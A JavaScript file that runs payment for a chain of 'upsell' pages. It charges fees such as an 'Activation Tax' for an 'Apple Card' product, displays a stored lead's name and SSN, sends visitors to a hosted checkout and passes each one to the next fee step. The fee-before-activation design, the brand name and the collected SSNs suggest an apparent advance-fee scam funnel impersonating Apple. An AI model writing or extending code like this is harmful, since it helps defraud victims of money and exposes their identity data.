/*
 * Shared payment logic for the upsell pages.
 *
 * Each upsell HTML defines a global UPSELL_CONFIG:
 *   {
 *     id:    'upp1-imposto',           // unique id, used as content_id
 *     title: 'Activation Tax',         // shown in tracking
 *     price: 17.45,                    // USD, two decimals
 *     next:  '../upp2-ativacao/index.html'  // relative path for skip / success
 *   }
 *
 * Flow: when the user clicks "Pay", we POST to /api/transaction (Cooud-backed)
 * and redirect the browser to the hosted Cooud checkout URL. After payment,
 * Cooud redirects back to `next` (which itself does the same dance) carrying
 * `?pay=ok&cooud_session_id=...`. On arrival we verify with /api/status and,
 * once APPROVED, advance to the next step.
 */

(function () {
  'use strict';

  if (!window.UPSELL_CONFIG) {
    console.error('UPSELL_CONFIG missing.');
    return;
  }

  var cfg = window.UPSELL_CONFIG;
  var amountCents = Math.round(cfg.price * 100);

  function $(id) { return document.getElementById(id); }
  function fmtUSD(v) { return '$' + v.toFixed(2); }

  function loadLead() {
    try { return JSON.parse(localStorage.getItem('applecard_lead') || '{}'); }
    catch (e) { return {}; }
  }
  function saveLead(patch) {
    var cur = loadLead();
    var u = Object.assign({}, cur, patch, { updated_at: Date.now() });
    localStorage.setItem('applecard_lead', JSON.stringify(u));
    return u;
  }

  function buildUrl(target, extra) {
    var u = new URL(target, window.location.href);
    new URLSearchParams(window.location.search).forEach(function (v, k) {
      if (k !== 'pay' && k !== 'cooud_session_id') u.searchParams.set(k, v);
    });
    if (extra) {
      Object.keys(extra).forEach(function (k) {
        if (extra[k] !== undefined && extra[k] !== null) u.searchParams.set(k, extra[k]);
      });
    }
    return u.toString();
  }

  // ─── Initial loading screen ───
  window.addEventListener('load', function () {
    var ls = $('loadingScreen');
    if (!ls) return;
    setTimeout(function () {
      ls.classList.add('hide');
      var main = $('mainPage');
      if (main) main.style.display = '';
      setTimeout(function () { ls.style.display = 'none'; }, 400);
    }, 700);
  });

  // ─── Minimal verification overlay (shown on return from Cooud) ───
  var VERIFY_OVERLAY = ''
    + '<div class="pay-overlay active" id="verifyOverlay">'
    +   '<div class="pay-modal">'
    +     '<div class="pay-modal-handle"></div>'
    +     '<div class="pay-modal-header">'
    +       '<h3>Confirming payment</h3>'
    +     '</div>'
    +     '<div class="pay-modal-body">'
    +       '<div class="pay-status" id="verifyStatus">'
    +         '<div class="ps-icon"><svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg></div>'
    +         '<div class="ps-title" id="verifyTitle">Confirming your payment...</div>'
    +         '<div class="ps-desc" id="verifyDesc">This usually takes a few seconds.</div>'
    +       '</div>'
    +     '</div>'
    +   '</div>'
    + '</div>';

  document.addEventListener('DOMContentLoaded', function () {
    var lead = loadLead();
    var customerName = $('customerName');
    if (customerName) customerName.textContent = lead.nome || '—';
    var customerNif = $('customerNif');
    if (customerNif) customerNif.textContent = (lead.ssn_masked || lead.ssn || lead.nif_masked || lead.nif || '—');

    var priceEls = document.querySelectorAll('[data-price-display]');
    priceEls.forEach(function (el) { el.textContent = fmtUSD(cfg.price); });

    if (window.track) {
      window.track('ViewContent', {
        value: cfg.price,
        currency: 'USD',
        content_id: cfg.id,
        content_name: cfg.title,
        content_type: 'product'
      });
    }

    var payBtn = $('payBtn');
    if (payBtn) payBtn.addEventListener('click', startPayment);

    var skipBtn = $('skipBtn');
    if (skipBtn) skipBtn.addEventListener('click', function () {
      if (window.track) window.track('UpsellSkipped', { content_id: cfg.id, value: cfg.price, currency: 'USD' });
      goToNext();
    });

    // ─── Return from Cooud: verify session then advance ───
    var params = new URLSearchParams(window.location.search);
    if (params.get('pay') === 'ok' && params.get('cooud_session_id')) {
      var wrap = document.createElement('div');
      wrap.innerHTML = VERIFY_OVERLAY;
      document.body.appendChild(wrap.firstChild);
      verifyAndAdvance(params.get('cooud_session_id'));
    }
  });

  async function startPayment() {
    var btn = $('payBtn');
    btn.classList.add('loading');
    btn.disabled = true;

    if (window.track) {
      window.track('AddPaymentInfo', {
        value: cfg.price,
        currency: 'USD',
        content_id: cfg.id,
        payment_method: 'cooud_hosted'
      });
    }

    var lead = loadLead();

    // After payment, Cooud returns to THIS upsell page so we can verify, then
    // forward to cfg.next. successPath/cancelPath are relative to the site root.
    var here = window.location.pathname.replace(/^\//, '');

    var payload = {
      amount: amountCents,
      currency: 'usd',
      payerName: lead.nome || 'Customer',
      email: lead.email || '',
      phone: lead.telefone || lead.phone || '',
      productName: 'Apple Card — ' + cfg.title,
      successPath: here,
      cancelPath: here,
      utm: window.location.search.replace(/^\?/, ''),
      funnelStep: cfg.id
    };

    try {
      var res = await fetch('/api/transaction', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      var data = await res.json();

      if (!data.success || !data.url) {
        alert('Could not start payment: ' + (data.error || 'please try again.'));
        btn.classList.remove('loading');
        btn.disabled = false;
        return;
      }

      saveLead({
        ['upsell_' + cfg.id + '_session']: data.transactionId,
        ['upsell_' + cfg.id + '_initiated_at']: Date.now()
      });

      window.location.assign(data.url);

    } catch (e) {
      console.error('upsell payment error', e);
      alert('Connection error. Check your internet and try again.');
      btn.classList.remove('loading');
      btn.disabled = false;
    }
  }

  async function verifyAndAdvance(sessionId) {
    var titleEl = $('verifyTitle');
    var descEl = $('verifyDesc');

    var maxAttempts = 12;   // ~36s
    var delayMs = 3000;

    for (var i = 0; i < maxAttempts; i++) {
      try {
        var r = await fetch('/api/status?id=' + encodeURIComponent(sessionId), { cache: 'no-store' });
        var out = await r.json();
        if (out.status === 'APPROVED') {
          // Purchase event — pair with server-side via stable event_id.
          try {
            if (window.ttq) {
              var eid = 'purchase_' + sessionId;
              window.ttq.track('Purchase', {
                value: cfg.price,
                currency: 'USD',
                content_type: 'product',
                content_id: cfg.id,
                content_name: cfg.title,
                transaction_id: sessionId,
                event_id: eid
              }, { event_id: eid });
            }
          } catch (e) {}

          saveLead({
            ['upsell_' + cfg.id + '_paid']: true,
            ['upsell_' + cfg.id + '_paid_at']: Date.now()
          });

          var status = $('verifyStatus');
          if (status) status.classList.add('paid');
          if (titleEl) titleEl.textContent = 'Payment confirmed!';
          if (descEl) descEl.textContent = 'Continuing to the next step...';
          setTimeout(goToNext, 1500);
          return;
        }
        if (out.status === 'REFUSED') break;
      } catch (e) { /* keep polling */ }
      await new Promise(function (r) { setTimeout(r, delayMs); });
    }

    if (titleEl) titleEl.textContent = 'Could not confirm payment';
    if (descEl) {
      descEl.innerHTML = 'We did not receive confirmation from Cooud yet. ' +
        '<a href="' + window.location.pathname + '" style="color:var(--apple-blue);font-weight:700;text-decoration:none">Try again</a>';
    }
  }

  function goToNext() {
    var next = cfg.next || '../../dashboard.html';
    window.location.href = buildUrl(next);
  }
})();
